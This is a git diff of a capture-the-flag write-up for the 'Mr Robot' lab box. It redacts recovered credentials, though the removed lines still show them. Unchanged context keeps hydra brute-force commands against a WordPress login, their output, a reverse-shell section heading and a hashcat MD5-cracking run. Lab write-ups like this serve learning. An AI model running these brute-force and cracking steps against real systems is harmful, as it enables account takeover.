@@ -207,15 +207,15 @@ $ hydra -T100 -f -L www/downloads/cred.dic -p passwd -o userenum.txt 10.10.87.21
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:01:32
 [WARNING] reducing maximum tasks to MAXTASKS (64)
 [DATA] attacking http-post-form://10.10.87.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:F=Invalid username.
-[80][http-post-form] host: 10.10.87.211   login: elliot   password: passwd
+[80][http-post-form] host: 10.10.87.211   login: *******   password: passwd
 [STATUS] attack finished for 10.10.87.211 (valid pair found)	
 ```
-We find a valid user as **elliot**. Now we can enumerate for the password.\
+We find a valid user. Now we can enumerate for the password.\
 We do it one after the other to save us loads of time. If we fuzzed both together, it would generate loads of invalid creds and to track invalid status would also be a pain.\
 Like earlier, **invalid passwords** can be seperated in two ways. First, we can use the invalid password reponse returned. Better is to use the _STATUS_CODE : 302_ as on valid credentials the site will redirect to the /wp-admin page.
 Let's run hydra now.
 We use some different options like
-1. -l : to supply the enumerated username - _elliot_.
+1. -l : to supply the enumerated username 
 2. -P : supply a dictionary of possible passwords. - _fsocity.dic_
 3. :S=302 : To tell post-form module to display the credentials only for a _REDIRECTION_. Thus, giving us the valid credentials. 
 
@@ -229,15 +229,15 @@ direct_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302"
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:45:26
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
 [DATA] attacking http-post-form://10.10.87.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302
-[80][http-post-form] host: 10.10.87.211   login: elliot   password: ER28-0652
+[80][http-post-form] host: 10.10.87.211   login: *******   password: ************
 [STATUS] attack finished for 10.10.87.211 (valid pair found)
 ```
-We find valid credentails as **elliot:ER28-0652**. We can now login using this.
+We find valid credentails. We can now login using this.
 
 
 ## WORDPRESS & REVRESE SHELL
 
-We are greeted with a standard _/wp-admin_ page and we are logged in as Elliot Alderson. We will move around and see if we find something that can get us a shell.
+We are greeted with a standard _/wp-admin_ page. We will move around and see if we find something that can get us a shell.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/wp_admin.png)
 \
@@ -459,10 +459,10 @@ drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
 daemon@linux:/home/robot$ cat password.raw-md5 
-robot:c3fcd3d76192e4007dfb496cca67e13b
+c3fcd3d76192e4007dfb496cca67e13b
 ```
 
-We can use following command to find the mode for cracking raw md5. We can then supply famous rockyou list to crack the md5sum. We find that the credentials for the user robot are as **robot:abcdefghijklmnopqrstuvwxyz**.
+We can use following command to find the mode for cracking raw md5. We can then supply famous rockyou list to crack the md5sum. We find that the credentials for the user robot.
 
 ```bash
 ~/Desktop/Boxes/Try_Hack_Me/Mr_Robot_CTF$ hashcat --example-hashes                                                                                                               
@@ -489,7 +489,7 @@ Dictionary cache built:
 * Keyspace..: 14344385
 * Runtime...: 1 sec
 
-c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+c3fcd3d76192e4007dfb496cca67e13b:********************************
                                                  
 Session..........: hashcat
 Status...........: Cracked
